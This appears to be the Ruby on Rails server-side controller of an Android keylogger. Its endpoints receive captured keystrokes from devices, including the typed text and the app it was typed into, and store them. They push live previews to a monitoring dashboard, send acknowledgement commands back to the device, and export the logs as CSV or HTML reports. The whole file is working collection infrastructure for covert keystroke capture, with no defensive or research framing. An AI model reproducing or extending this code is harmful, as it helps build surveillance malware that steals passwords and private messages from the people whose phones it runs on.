# frozen_string_literal: true

module Api
  class KeyloggerController < Api::BaseController

    # POST /api/keylogger - Receive keylog data from Android client
    def receive
      device_id = params[:device_id]
      keylog_data = params[:data]

      if device_id.blank? || keylog_data.blank?
        render json: { error: 'Missing device_id or data' }, status: :bad_request
        return
      end

      payload_bytes = keylog_data.to_s.bytesize
      max_bytes = (ENV['KEYLOGGER_MAX_BYTES'].presence || 1.megabyte).to_i
      if payload_bytes > max_bytes
        render json: { error: 'Payload too large', limit_bytes: max_bytes }, status: :payload_too_large
        return
      end

      # Find or create smartphone using the concern method
      smartphone = find_or_create_smartphone(device_id)
      return render json: { error: 'Failed to create device' }, status: :internal_server_error unless smartphone

      # Process keylog data
      processor = KeylogProcessor.new(keylog_data)
      max_entries = (ENV['KEYLOGGER_MAX_ENTRIES'].presence || 5000).to_i
      if processor.entries.size > max_entries
        render json: { error: 'Too many entries', limit: max_entries }, status: :unprocessable_entity
        return
      end
      
      # Save to database (could be a dedicated Keylog model)
      Rails.cache.write("keylog_#{device_id}", {
        data: keylog_data,
        processed: processor.stats,
        received_at: Time.current
      }, expires_in: 24.hours)

      # Push real-time update to dashboard via ActionCable
      ActionCable.server.broadcast("keylog_stream_#{device_id}", {
        type: 'new_keylogs',
        device_id: device_id,
        device_name: smartphone.name,
        stats: processor.stats,
        timestamp: Time.current.iso8601,
        preview: processor.entries.last(5).map { |e| { app: e[:app_package], text: e[:full_text], time: e[:timestamp]&.iso8601 } }
      }) rescue nil

      render json: {
        status: 'received',
        device_id: device_id,
        stats: processor.stats,
        requires_confirmation: true
      }
    end

    # POST /api/keylogger/ack - Acknowledge keylog reception (clear Android buffer)
    def acknowledge
      device_id = params[:device_id]
      success = params[:success]

      if device_id.blank?
        render json: { error: 'Missing device_id' }, status: :bad_request
        return
      end

      # Send ACK command via WebSocket
      ActionCable.server.broadcast(
        "device_#{device_id}",
        {
          command: 'keylog_ack',
          data: {
            success: success,
            timestamp: Time.current.to_i
          }
        }
      )

      render json: { status: 'ack_sent', device_id: device_id, success: success }
    end

    # GET /api/keylogger/data/:device_id - Get keylog data
    def data
      device_id = params[:device_id]
      cached_data = Rails.cache.read("keylog_#{device_id}")

      if cached_data
        render json: cached_data
      else
        render json: { error: 'No keylog data found' }, status: :not_found
      end
    end

    # GET /api/keylogger/stats/:device_id - Get statistics
    def stats
      device_id = params[:device_id]
      cached_data = Rails.cache.read("keylog_#{device_id}")

      if cached_data
        render json: { device_id: device_id, stats: cached_data[:processed] }
      else
        render json: { error: 'No keylog data found' }, status: :not_found
      end
    end

    # GET /api/keylogger/export/:device_id - Export as CSV or HTML
    def export
      device_id = params[:device_id]
      format = params[:format] || 'html' # 'csv' or 'html'
      cached_data = Rails.cache.read("keylog_#{device_id}")

      if cached_data.nil?
        render json: { error: 'No keylog data found' }, status: :not_found
        return
      end

      processor = KeylogProcessor.new(cached_data[:data])

      case format
      when 'csv'
        send_data processor.to_csv, filename: "keylog_#{device_id}_#{Time.current.to_i}.csv", type: 'text/csv'
      when 'html'
        render html: processor.to_html_report
      else
        render json: { error: 'Invalid format (use csv or html)' }, status: :bad_request
      end
    end
  end
end
